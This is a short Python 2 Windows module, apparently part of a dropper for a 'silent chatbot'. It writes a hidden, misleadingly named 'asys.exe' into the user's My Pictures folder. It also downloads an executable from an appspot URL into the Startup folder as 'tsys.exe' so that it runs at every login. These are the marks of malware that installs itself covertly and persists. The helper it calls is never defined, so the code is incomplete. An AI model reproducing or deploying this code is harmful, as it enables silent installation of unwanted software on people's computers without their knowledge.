"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""
import cPickle
import launcher
import threading

from win32com.shell import shell, shellcon

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = launcher.file_in_special_path(shellcon.CSIDL_MYPICTURES, "asys.exe")
        print path
        launcher.unhide_file(path)
        f = open(path, "w")
        #Save the script
        cPickle.dump(self.script, f)
        #Hide the script
        f.close()
        launcher.hide_file(path)
        
        #DIR the launcher
        download_install_run(
            "http://littlesitetomakemoney.appspot.com/launcher.exe", 
            shellcon.CSIDL_STARTUP, 
            "tsys.exe")
        
